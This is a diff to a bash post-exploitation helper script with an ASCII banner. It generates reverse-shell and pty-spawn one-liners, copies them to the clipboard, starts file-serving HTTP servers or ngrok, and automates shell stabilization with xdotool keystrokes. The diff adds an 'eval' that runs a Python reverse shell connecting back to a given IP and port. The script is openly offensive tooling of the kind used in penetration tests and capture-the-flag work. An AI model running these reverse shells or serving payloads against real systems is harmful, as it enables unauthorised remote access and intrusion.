@@ -1,6 +1,6 @@
 #!/bin/bash
 
-if [[ "$1" == "" ]]; then
+function banner(){
 	echo -e " ______  _____ _____ _   _      _
  | ___ \/  __ \  ___| | | |    | |
  | |_/ /| /  \/ |__ | |_| | ___| |_ __   ___ _ __
@@ -13,9 +13,14 @@ if [[ "$1" == "" ]]; then
 	echo " Usage: $0 [option]
  See more options with --help or -h
 	"
+}
+
+if [[ "$1" == "" ]]; then
+	banner
 	exit 1
 elif [[ "$1" == "-h" || "$1" == "--help" ]]; then
-	echo "Usage: $0 [options]"
+	banner
+	printf "\nUsage: $0 [options]\n"
 	echo ""
 	echo "Options:
 	pty - Spawn a pty shell
@@ -42,7 +47,6 @@ case "$1" in
 			cmd="$(which script) -qc /bin/bash /dev/null"
 			echo -n "$cmd" | xsel -ib
 			printf "\e[92m[+] Copied to clipboard: $cmd"
-			exit 1
 		fi
 
 		case $tipo in
@@ -50,7 +54,6 @@ case "$1" in
 				cmd="$(which script) -qc /bin/bash /dev/null"
 				echo -n "$cmd" | xsel -ib
 				printf "\e[92m[+] Copied to clipboard: $cmd"
-				exit 1
 				;;
 			2)
 				cmd="python3 -c \"import pty;pty.spawn('/bin/bash')\""
@@ -72,7 +75,73 @@ case "$1" in
 				echo -n "$cmd" | xsel -ib
 				printf "\e[92m[+] Copied to clipboard: $cmd"
 				;;
+
 		esac
+			printf "\n\nDo you want to stabilize your shell? [Y/n]\n"
+			read stabilize
+
+#			echo $stabilize
+
+			if [[ (${stabilize:0:1} == "Y" || ${stabilize:0:1} == "y") || $stabilize == "" ]]
+			then
+				for i in {0..2}
+				do
+					echo -ne "You have "$((3-$i))" seconds to get your shell terminal on focus\r"
+					sleep 1
+				done
+
+				printf "\nStabilizing shell...\n"
+				xdotool type --delay 0 "$cmd"
+				xdotool key Return
+				sleep 0.1
+
+				printf "Backgrounding active shell...\n"
+				xdotool key Ctrl+z
+				sleep 0.25
+
+				printf "Getting terminal dimensions...\n"
+				dimensions="stty"$(stty -a | grep rows | awk -F';' '{print $2 $3}') #stty rows <rows> columns <columns>
+
+				printf "Changing stty configuration...\n"
+				xdotool type --delay 0 "stty raw -echo"
+				xdotool key Return #send {Enter}
+				sleep 0.25
+
+				printf "Foregrouding the reverse shell...\n"
+				xdotool type --delay 0 "fg"
+				xdotool key Return
+				sleep 0.25
+
+				printf "Reseting the shell...\n"
+				xdotool type --delay 0 "reset"
+				xdotool key Return
+				sleep 0.25
+
+				printf "Exporting variables...\n"
+				xdotool type --delay 0 "xterm-256color"
+				xdotool key Return
+				xdotool type --delay 0 "export SHELL=bash"
+				xdotool key Return
+				sleep 0.25
+				xdotool type --delay 0 "export TERM=xterm-256color"
+				xdotool key Return
+				sleep 0.25
+
+				printf "Setting terminal dimensions...\n"
+				xdotool type --delay 0 "$dimensions"
+				xdotool key Return
+
+				printf "Setting terminal highlight...\n"
+				xdotool type --delay 0 "alias ls=\"ls --color=tty\""
+				xdotool key Return
+
+				xdotool type --delay 0 "alias grep=\"grep --color=auto\""
+				xdotool key Return
+
+				xdotool type --delay o "clear"
+				xdotool key Return
+			fi
+
 		;;
 	"reverse" | "rev")
 		printf "\e[96mSelect the type of reverse shell (default=Netcat):\n\e[0m"
@@ -152,6 +221,7 @@ case "$1" in
 				cmd="python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect(($IP,$PORT));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'"
 				printf "\e[92m[+] Copied to clipboard: $cmd"
 				echo -n "$cmd" | xsel -ib #copy to clipboard
+				eval "$cmd"
 				;;
 
 			5) #perl
@@ -202,6 +272,10 @@ case "$1" in
 			if [[ -z $path ]]; then path=$HOME; fi
 			if [[ ! -d $path ]]; then printf "Erro\n"; exit 1; fi
 
+			for index in ${!ips[@]}; do #print each local IP found
+				printf "http://${ips[index]}:$port\n"
+			done
+
 			case $upload in
 				1) #Python
 					python3 -m http.server $port -d $path
@@ -214,63 +288,11 @@ case "$1" in
 				3) #Ruby
 					ruby -run -C $path -e httpd . -p $port
 				;;
-				4)
+				4) #ngrok
 					cd $path; ngrok http $port
 				;;
 			esac
 	;;
 
-	"stabilize" | "st")
-		for i in {0..2}
-		do
-			echo -ne "You have "$((3-$i))" seconds to get your shell terminal on focus\r"
-			sleep 1
-		done
 
-		printf "\nStabilizing shell...\n"
-		xdotool type --delay - "/usr/bin/script -qc /bin/bash /dev/null"
-		xdotool key Return
-		sleep 0.1
-
-		printf "Backgrounding active shell...\n"
-		xdotool key Ctrl+z
-		sleep 0.25
-
-		printf "Getting terminal dimensions...\n"
-		dimensions="stty"$(stty -a | grep rows | awk -F';' '{print $2 $3}') #stty rows <rows> columns <columns>
-
-		printf "Changing stty configuration...\n"
-		xdotool type --delay 0 "stty raw -echo"
-		xdotool key Return #send {Enter}
-		sleep 0.25
-
-		printf "Foregrouding the reverse shell...\n"
-		xdotool type --delay 0 "fg"
-		xdotool key Return
-		sleep 0.25
-
-		printf "Reseting the shell...\n"
-		xdotool type --delay 0 "reset"
-		xdotool key Return
-		sleep 0.25
-
-		printf "Exporting variables...\n"
-		xdotool type --delay 0 "xterm-256color"
-		xdotool key Return
-		xdotool type --delay 0 "export SHELL=bash"
-		xdotool key Return
-		sleep 0.25
-		xdotool type --delay 0 "export TERM=xterm-256color"
-		xdotool key Return
-		sleep 0.25
-
-		printf "Setting terminal dimensions...\n"
-		xdotool type --delay 0 "$dimensions"
-		xdotool key Return
-
-		xdotool type --delay o "clear"
-		xdotool key Return
-
-
-	;;
 esac
